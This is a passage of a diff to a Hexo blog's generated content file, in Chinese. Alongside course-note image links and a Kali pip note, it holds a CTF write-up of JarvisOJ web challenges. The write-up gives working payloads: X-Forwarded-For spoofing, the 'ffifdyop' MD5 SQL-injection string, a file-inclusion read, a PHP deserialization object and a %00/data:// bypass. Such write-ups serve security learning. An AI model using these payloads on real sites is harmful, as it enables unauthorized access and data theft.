-<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/31/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331155119753.png"  alt="image-20200331155119753"></p>
-<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/31/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331155249593.png"  alt="image-20200331155249593"></p>
-<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/31/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331160616625.png"  alt="image-20200331160616625"></p>
-<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/31/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331160838992.png"  alt="image-20200331160838992"></p>
-<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/31/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331160918308.png"  alt="image-20200331160918308"></p>
-<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/31/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331161812692.png"  alt="image-20200331161812692"></p>
-<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/31/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331161856893.png"  alt="image-20200331161856893"></p>
+    <url>/2020/07/01/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="第四章-原根与指数"><a href="#第四章-原根与指数" class="headerlink" title="第四章 原根与指数"></a>第四章 原根与指数</h1><h2 id="4-1-次数"><a href="#4-1-次数" class="headerlink" title="4.1 次数"></a>4.1 次数</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/01/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331160537835.png"  alt="image-20200331160537835"></p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/01/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331155119753.png"  alt="image-20200331155119753"></p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/01/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331155249593.png"  alt="image-20200331155249593"></p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/01/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331160616625.png"  alt="image-20200331160616625"></p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/01/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331160838992.png"  alt="image-20200331160838992"></p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/01/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331160918308.png"  alt="image-20200331160918308"></p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/01/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331161812692.png"  alt="image-20200331161812692"></p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/01/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331161856893.png"  alt="image-20200331161856893"></p>
 ]]></content>
       <categories>
         <category>major</category>
       </categories>
       <tags>
         <tag>信安数基</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali pip安装</title>
+    <url>/2020/06/17/pip%E5%AE%89%E8%A3%85/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>wget <a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py</a></p>
+<p>python3 get-pip.py</p>
+<p>添加环境变量</p>
+<p>vim /etc/profile,添加warning中的内容，如果没有则掠过</p>
+<p>pip -V测试安装是否成功</p>
+]]></content>
+      <categories>
+        <category>kali</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JARVISOJ WEB题目学习</title>
+    <url>/2020/06/16/jarvisoj/jarvisoj_web/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h1><blockquote>
+<p>题目链接：<a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a></p>
+<p>参考题解：<a href="https://blog.csdn.net/weixin_44077544/article/details/89407287" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44077544/article/details/89407287</a></p>
+</blockquote>
+<p>打开之后显示<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616170910514.png"  alt="image-20200616170910514"></p>
+<div class="note info">
+            <p>curl命令：</p><p>curl <a href="http://xxxxxx" target="_blank" rel="noopener">http://xxxxxx</a></p><p>返回该网页的html</p><p>–local-port<NUM>              强制使用本地端口号</NUM></p>
+          </div>
+
+<p>输入</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl --<span class="built_in">local</span>-port 51 http://web.jarvisoj.com:32770/</span><br></pre></td></tr></table></figure>
+
+<p>返回</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616172140435.png"  alt="image-20200616172140435"></p>
+<h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><blockquote>
+<p>题目链接：<a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a></p>
+<p>参考题解：<a href="https://www.cnblogs.com/IMBlackMs/p/11272848.html" target="_blank" rel="noopener">https://www.cnblogs.com/IMBlackMs/p/11272848.html</a></p>
+</blockquote>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616172347717.png"  alt="image-20200616172347717"></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>只允许本机登录</p>
+<p>考虑添加header:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ｘ-Forward-For          127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>来构造一个<font color="red">“原始客户端为localhost”的报文</font>，达到access的目的</p>
+<h2 id="设置代理、抓包"><a href="#设置代理、抓包" class="headerlink" title="设置代理、抓包"></a>设置代理、抓包</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616173838544.png"  alt="image-20200616173838544"></p>
+<p>打开burpsuite，勾选127.0.0.1:8080</p>
+<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616173916784.png"  alt="image-20200616173916784" style="zoom: 80%;">
+
+<p>调整至intercept is on，进行抓包</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616174010129.png"  alt="image-20200616174010129"></p>
+<p>添加header，点击forward发送</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616174246689.png"  alt="image-20200616174246689"></p>
+<p>得到flag</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616174309897.png"  alt="image-20200616174309897"></p>
+<h1 id="LOGIN"><a href="#LOGIN" class="headerlink" title="LOGIN"></a>LOGIN</h1><ul>
+<li>burpsuite</li>
+<li>md5</li>
+</ul>
+<p>打开proxy-options-intercept server responses</p>
+<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616175942620.png"  alt="image-20200616175942620" style="zoom:80%;">
+
+<p>看到hint</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hint: &quot;select * from &#96;admin&#96; where password&#x3D;&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616175832244.png"  alt="image-20200616175832244" style="zoom:200%;">
+
+
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>;;) &#123; </span><br><span class="line"> <span class="keyword">for</span> ($c = <span class="number">0</span>; $c &lt; <span class="number">1000000</span>; $c++, $i++)</span><br><span class="line">  <span class="keyword">if</span> (stripos(md5($i, <span class="keyword">true</span>), <span class="string">'\'or\''</span>) !== <span class="keyword">false</span>)</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"\nmd5($i) = "</span> . md5($i, <span class="keyword">true</span>) . <span class="string">"\n"</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>（这个代码我没有跑出来，TLE了）</p>
+<p>ffifdyop</p>
+<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200616204517605.png"  alt="image-20200616204517605" style="zoom:67%;">
+
+<h1 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h1><ul>
+<li>文件包含漏洞</li>
+<li>序列化</li>
+</ul>
+<blockquote>
+<p>题目链接：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p>
+<p>参考题解：<a href="https://blog.csdn.net/qq1045553189/article/details/87562204?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-1" target="_blank" rel="noopener">https://blog.csdn.net/qq1045553189/article/details/87562204?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-1</a></p>
+</blockquote>
+<p>打开后是一张图片</p>
+<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200617115013351.png"  alt="image-20200617115013351" style="zoom: 33%;">
+
+<p>查看网页源代码，发现showing.php,和一张base64编码的img，解密后是shield.jpg</p>
+<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200617115034966.png"  alt="image-20200617115034966" style="zoom:67%;">
+
+<p>点进去，发现是图片编码</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200617115053325.png"  alt="image-20200617115053325"></p>
+<p>判断是文件包含漏洞</p>
+<p>尝试读取showimg.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;web.jarvisoj.com:32768&#x2F;showimg.php?img&#x3D;c2hvd2ltZy5waHA&#x3D;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font color="green">stripos查找字符串首次出现的位置（不区分大小写）</font></p>
+<p><font color="green">代码中过滤掉了..   /   \\(切换目录的字符)   和pctf</font></p>
+<p>尝试获取index.php(aW5kZXgucGhw)</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200617140304865.png"  alt="image-20200617140304865"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;web.jarvisoj.com:32768&#x2F;showimg.php?img&#x3D;aW5kZXgucGhw</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);\\反序列化</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> width=<span class="string">"100%"</span>/&gt;</span><br></pre></td></tr></table></figure>
+
+<p><font color="green">使用GET传参，参数名‘class’</font></p>
+<p>读shield.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32768&#x2F;showimg.php?img&#x3D;c2hpZWxkLnBocA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//flag is in pctf.php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>showimg.php对pctf进行了过滤，但是readfile()没有</p>
+<p>编写php脚本，得到序列化后的shield实例</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//flag is in pctf.php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $x=<span class="keyword">new</span> Shield (<span class="string">"pctf.php"</span>);</span><br><span class="line">  <span class="keyword">echo</span> serialize($x);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到序列化结果<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200617140000130.png"  alt="image-20200617140000130"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32768&#x2F;index.php?class&#x3D;O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200617140456082.png"  alt="image-20200617140456082"></p>
+<h1 id="IN-A-MESS"><a href="#IN-A-MESS" class="headerlink" title="IN A MESS"></a>IN A MESS</h1><blockquote>
+<p>题目链接：<a href="http://web.jarvisoj.com:32780/" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/</a></p>
+<p>题解链接：<a href="https://blog.csdn.net/wyj_1216/article/details/82954242" target="_blank" rel="noopener">https://blog.csdn.net/wyj_1216/article/details/82954242</a></p>
+</blockquote>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618153328981.png"  alt="image-20200618153328981"></p>
+<p>查看源码<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618153358706.png"  alt="image-20200618153358706"></p>
+<p>查看index.phps</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618153449177.png"  alt="image-20200618153449177"></p>
+<blockquote>
+<p>转载自：<a href="https://www.jianshu.com/p/cb124701a5d8" target="_blank" rel="noopener">https://www.jianshu.com/p/cb124701a5d8</a></p>
+<p>1.<code>stripos(字符串a，字符串b)函数</code>查找字符串b在字符串a中第一次出现的位置（不区分大小写）<br>2.<code>file_get_contents</code> 将整个文件读入一个字符串<br>3.<code>eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;)</code> 判断”1114”这个字符串里面是否有符合”111”.substr($b,0,1)这个规则的</p>
+<p>注，php5.3以后不支持eregi</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>要求</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>id</td>
+<td>id==0</td>
+<td>前面有非零的判断，所以用0e或‘0’绕过</td>
+</tr>
+<tr>
+<td>b</td>
+<td>strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4</td>
+<td>这里要求：b的长度大于5，且是基于eregi函数的弱类型，用%00的绕过（ strlen函数对%00不截断但substr截断）那么可以令<code>b=%00411111</code></td>
+</tr>
+<tr>
+<td>a</td>
+<td>由data进行赋值：<code>$data = @file_get_contents($a,&#39;r&#39;)</code> 而又有<code>$data==&quot;1112 is a nice lab!&quot;</code></td>
+<td>可以利用远程文件包含在<code>allow_url_include</code>开启时可以使用，但发现对<code>$a</code>有了<code>.</code>过滤所以还是data协议比较稳妥</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>data类型的URL格式：<a href="https://blog.csdn.net/lxgwm2008/article/details/38437875" target="_blank" rel="noopener">https://blog.csdn.net/lxgwm2008/article/details/38437875</a></p>
+<p>对于一些小数据，可以在网页中直接嵌入，而不是从外部文件载入，减少服务器负载</p>
+<p>例如直接在浏览器输入data:text/html,<html><body><p><b>Hello, world!</b></p></body></html></p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618155848440.png"  alt="image-20200618155848440"></p>
+<p>或者运行</p>
+<p>（Url是一种基于文本的协议，所以gif/png/jpeg这种二进制属于需要用base64进行编码。换句话说，引入base64以后，就可以支持任意形式的数据格式。）</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> </span></span><br><span class="line"><span class="meta">  <span class="meta-string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-class">.title</span> &#123;</span></span><br><span class="line">	background-image:url(data:image/gif;base64,R0lGODlhAQAcALMAAMXh96HR97XZ98Hf98Xg97DX97nb98Lf97vc98Tg973d96rU97ba97%2Fe96XS9wAAACH5BAAAAAAALAAAAAABABwAAAQVMLhVBDNItXESAURyDI2CGIxQLE4EADs%3D);</span><br><span class="line"><span class="css">	<span class="selector-tag">background-repeat</span><span class="selector-pseudo">:repeat-x</span>;</span></span><br><span class="line"><span class="css">	<span class="selector-tag">height</span><span class="selector-pseudo">:28px</span>;</span></span><br><span class="line">	line-height: 28px;</span><br><span class="line"><span class="css">	<span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>Hello, world!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618160036095.png"  alt="image-20200618160036095"></p>
+<p>data类型的Url大致有以下几种形式</p>
